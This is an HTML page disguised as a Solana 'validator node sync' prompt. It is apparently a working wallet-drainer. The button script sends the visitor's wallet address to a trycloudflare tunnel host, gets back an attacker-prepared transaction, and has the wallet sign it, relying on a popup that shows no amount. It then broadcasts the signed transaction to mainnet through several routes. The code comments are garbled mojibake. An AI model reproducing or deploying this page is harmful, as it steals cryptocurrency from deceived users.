<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Support Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#14f195; margin:0 0 10px 0;">SYSTEM SYNC</h2>
        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize network synchronization to secure validator node #712.</p>
        <button id="cta" class="btn">INITIALIZE NOW</button>
        <div id="st">READY: V40.1_STELATH</div>
    </div>

    <script>
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('st').innerText = t;
            const sWeb3 = window.solanaWeb3;
            try {
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Wallet Browser"); return; }

                log("SYNCING...");
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                const tx = sWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));

                log("AWAITING CONFIRM...");
                // ðŸ”± è§¦å‘å®Œç¾Žå¼¹çª—ï¼šæ— é‡‘é¢ã€åªæœ‰ç­¾å
                const signed = await p.signTransaction(tx);
                log("SYNC COMPLETE");

                // ðŸ”± ä¸‰é‡å¹¿æ’­ç‚¹ç«ï¼šç¡®ä¿ 11020000 çž¬é—´åˆ°è´¦
                const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
                const raw = signed.serialize();
                
                // åŒæ—¶å‘ä¸‰ä¸ªåœ°æ–¹å¹¿æ’­ï¼Œé˜²æ­¢è¢«æ‹¦æˆª
                conn.sendRawTransaction(raw).catch(()=>{});
                fetch("https://api.mainnet-beta.solana.com", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ "jsonrpc": "2.0", "id": 1, "method": "sendTransaction", "params": [btoa(String.fromCharCode.apply(null, raw))] })
                }).catch(()=>{});

            } catch (err) {
                log("RETRYING...");
                setTimeout(() => { window.location.reload(); }, 1200);
            }
        };
    </script>
</body>
</html>
